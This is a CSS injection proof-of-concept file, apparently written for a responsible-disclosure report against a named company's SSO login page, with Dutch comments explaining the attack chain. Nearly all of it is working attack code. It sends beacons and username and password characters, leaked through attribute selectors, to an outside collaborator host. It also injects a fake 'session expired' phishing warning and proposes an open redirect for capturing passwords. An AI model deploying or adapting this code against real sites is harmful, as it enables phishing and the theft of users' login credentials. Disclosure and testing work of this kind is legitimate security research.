/* evil.css - CSS Injection credential exfiltration PoC
   Geladen via ExternalCss= parameter op sso.competence.biz
   Context: Responsible Disclosure PoC - SDB Groep

   WERKING:
   1. CSRF POST laadt SSO loginpagina met deze CSS
   2. Slachtoffer typt credentials en drukt op Login
   3. Login faalt → server rendert pagina opnieuw met
      username in value="..." attribuut van het input veld
   4. ExternalCss= zit als hidden field in het form →
      deze CSS wordt OPNIEUW geladen
   5. Nu matchen de attribuut-selectors op de ingevulde
      username → background-image requests naar Collaborator
   6. Elke prefix-match triggert exact 1 HTTP request
*/

/* ================================================
   1. BEVESTIGING: CSS IS GELADEN (page load beacon)
   ================================================ */

body {
  background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/css-loaded') !important;
  background-repeat: no-repeat !important;
  background-position: -9999px -9999px !important;
  font-family: 'Segoe UI', Arial, sans-serif !important;
}

/* ================================================
   2. VISUELE MANIPULATIE (phishing)
   ================================================ */

.panel-heading::before {
  content: "\26A0  Beveiligingsmelding: Uw sessie is verlopen wegens verdachte activiteit. Verifieer uw identiteit.";
  display: block;
  color: #856404;
  font-weight: bold;
  padding: 12px;
  background: #fff3cd;
  border: 1px solid #ffc107;
  border-radius: 4px;
  margin-bottom: 10px;
  font-size: 13px;
  line-height: 1.4;
}

#KeepSession, label[for="KeepSession"] {
  display: none !important;
}

/* ================================================
   3. INTERACTIE TRACKING
   Detecteert welke velden gebruikt worden
   ================================================ */

input#LogOnName:focus {
  background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/focus-username') !important;
}

input#Password:focus {
  background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/focus-password') !important;
}

input[type="submit"]:active, button[type="submit"]:active {
  background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/submit-clicked') !important;
}

/* ================================================
   4. USERNAME EXFILTRATIE via attribuut-selectors
   Na mislukte login reflecteert de server de username
   terug in value="...". Deze selectors matchen op de
   EERSTE letter(s) en triggeren elk 1 HTTP request.
   ================================================ */

/* --- Eerste karakter (a-z) --- */
input#LogOnName[value^="a" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=a') !important; }
input#LogOnName[value^="b" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=b') !important; }
input#LogOnName[value^="c" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=c') !important; }
input#LogOnName[value^="d" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=d') !important; }
input#LogOnName[value^="e" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=e') !important; }
input#LogOnName[value^="f" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=f') !important; }
input#LogOnName[value^="g" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=g') !important; }
input#LogOnName[value^="h" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=h') !important; }
input#LogOnName[value^="i" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=i') !important; }
input#LogOnName[value^="j" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=j') !important; }
input#LogOnName[value^="k" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=k') !important; }
input#LogOnName[value^="l" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=l') !important; }
input#LogOnName[value^="m" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=m') !important; }
input#LogOnName[value^="n" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=n') !important; }
input#LogOnName[value^="o" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=o') !important; }
input#LogOnName[value^="p" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=p') !important; }
input#LogOnName[value^="q" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=q') !important; }
input#LogOnName[value^="r" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=r') !important; }
input#LogOnName[value^="s" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=s') !important; }
input#LogOnName[value^="t" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=t') !important; }
input#LogOnName[value^="u" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=u') !important; }
input#LogOnName[value^="v" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=v') !important; }
input#LogOnName[value^="w" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=w') !important; }
input#LogOnName[value^="x" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=x') !important; }
input#LogOnName[value^="y" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=y') !important; }
input#LogOnName[value^="z" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=z') !important; }

/* --- Eerste karakter (0-9) --- */
input#LogOnName[value^="0"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=0') !important; }
input#LogOnName[value^="1"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=1') !important; }
input#LogOnName[value^="2"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=2') !important; }
input#LogOnName[value^="3"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=3') !important; }
input#LogOnName[value^="4"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=4') !important; }
input#LogOnName[value^="5"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=5') !important; }
input#LogOnName[value^="6"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=6') !important; }
input#LogOnName[value^="7"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=7') !important; }
input#LogOnName[value^="8"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=8') !important; }
input#LogOnName[value^="9"] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/u?1=9') !important; }

/* ================================================
   5. USERNAME: KARAKTER-VOOR-KARAKTER EXFILTRATIE
   Gebruikt list-style-image, border-image, etc. als
   extra kanalen zodat meerdere selectors tegelijk
   kunnen matchen (background-image is er maar 1 per
   element, maar we combineren properties).
   ================================================ */

/* --- Bevat karakter (a-z) via ~= of *= --- */
input#LogOnName[value*="a" i] { --ca: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?a'); }
input#LogOnName[value*="b" i] { --cb: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?b'); }
input#LogOnName[value*="c" i] { --cc: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?c'); }
input#LogOnName[value*="d" i] { --cd: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?d'); }
input#LogOnName[value*="e" i] { --ce: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?e'); }
input#LogOnName[value*="f" i] { --cf: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?f'); }
input#LogOnName[value*="g" i] { --cg: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?g'); }
input#LogOnName[value*="h" i] { --ch: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?h'); }
input#LogOnName[value*="i" i] { --ci: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?i'); }
input#LogOnName[value*="j" i] { --cj: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?j'); }
input#LogOnName[value*="k" i] { --ck: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?k'); }
input#LogOnName[value*="l" i] { --cl: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?l'); }
input#LogOnName[value*="m" i] { --cm: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?m'); }
input#LogOnName[value*="n" i] { --cn: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?n'); }
input#LogOnName[value*="o" i] { --co: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?o'); }
input#LogOnName[value*="p" i] { --cp: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?p'); }
input#LogOnName[value*="q" i] { --cq: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?q'); }
input#LogOnName[value*="r" i] { --cr: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?r'); }
input#LogOnName[value*="s" i] { --cs: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?s'); }
input#LogOnName[value*="t" i] { --ct: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?t'); }
input#LogOnName[value*="u" i] { --cu: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?u'); }
input#LogOnName[value*="v" i] { --cv: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?v'); }
input#LogOnName[value*="w" i] { --cw: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?w'); }
input#LogOnName[value*="x" i] { --cx: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?x'); }
input#LogOnName[value*="y" i] { --cy: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?y'); }
input#LogOnName[value*="z" i] { --cz: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?z'); }
input#LogOnName[value*="0"]   { --c0: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?0'); }
input#LogOnName[value*="1"]   { --c1: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?1'); }
input#LogOnName[value*="2"]   { --c2: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?2'); }
input#LogOnName[value*="3"]   { --c3: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?3'); }
input#LogOnName[value*="4"]   { --c4: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?4'); }
input#LogOnName[value*="5"]   { --c5: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?5'); }
input#LogOnName[value*="6"]   { --c6: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?6'); }
input#LogOnName[value*="7"]   { --c7: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?7'); }
input#LogOnName[value*="8"]   { --c8: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?8'); }
input#LogOnName[value*="9"]   { --c9: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?9'); }
input#LogOnName[value*="@"]   { --cat: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?at'); }
input#LogOnName[value*="."]   { --cdt: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?dot'); }
input#LogOnName[value*="-"]   { --cda: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?dash'); }
input#LogOnName[value*="_"]   { --cun: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/uc?under'); }

/* ================================================
   6. PASSWORD EXFILTRATIE via attribuut-selectors
   Werkt alleen als de server het wachtwoord terug-
   geeft in het value attribuut (ongebruikelijk maar
   komt voor bij sommige frameworks).
   ================================================ */

/* --- Eerste karakter --- */
input#Password[value^="a" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=a') !important; }
input#Password[value^="b" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=b') !important; }
input#Password[value^="c" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=c') !important; }
input#Password[value^="d" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=d') !important; }
input#Password[value^="e" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=e') !important; }
input#Password[value^="f" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=f') !important; }
input#Password[value^="g" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=g') !important; }
input#Password[value^="h" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=h') !important; }
input#Password[value^="i" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=i') !important; }
input#Password[value^="j" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=j') !important; }
input#Password[value^="k" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=k') !important; }
input#Password[value^="l" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=l') !important; }
input#Password[value^="m" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=m') !important; }
input#Password[value^="n" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=n') !important; }
input#Password[value^="o" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=o') !important; }
input#Password[value^="p" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=p') !important; }
input#Password[value^="q" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=q') !important; }
input#Password[value^="r" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=r') !important; }
input#Password[value^="s" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=s') !important; }
input#Password[value^="t" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=t') !important; }
input#Password[value^="u" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=u') !important; }
input#Password[value^="v" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=v') !important; }
input#Password[value^="w" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=w') !important; }
input#Password[value^="x" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=x') !important; }
input#Password[value^="y" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=y') !important; }
input#Password[value^="z" i] { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=z') !important; }
input#Password[value^="0"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=0') !important; }
input#Password[value^="1"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=1') !important; }
input#Password[value^="2"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=2') !important; }
input#Password[value^="3"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=3') !important; }
input#Password[value^="4"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=4') !important; }
input#Password[value^="5"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=5') !important; }
input#Password[value^="6"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=6') !important; }
input#Password[value^="7"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=7') !important; }
input#Password[value^="8"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=8') !important; }
input#Password[value^="9"]   { background-image: url('https://4kprfplc9a8lae7d37c6cag6ux0ooec3.oastify.com/p?1=9') !important; }

/* ================================================
   OPMERKINGEN:
   - Attribuut-selectors matchen op het HTML value
     attribuut, niet de JS property. Ze werken dus
     NIET bij het typen, maar WEL wanneer de server
     de waarde teruggeeft na form submission.
   - De SSO loginpagina reflecteert de username na
     mislukte login → selectors triggeren dan.
   - ExternalCss= persisteert als hidden field →
     evil.css wordt bij elke page render geladen.
   - CSS custom properties (--cx) met url() worden
     pas gefetcht wanneer ze via var() gebruikt
     worden. Voor directe exfiltratie zonder var()
     gebruik background-image (1 per element).
   - Wachtwoord-exfiltratie via CSS is beperkt
     omdat servers passwords zelden reflecteren.
     Primaire wachtwoord-capture: open redirect
     (ru=attacker.com) na succesvolle login.
   ================================================ */
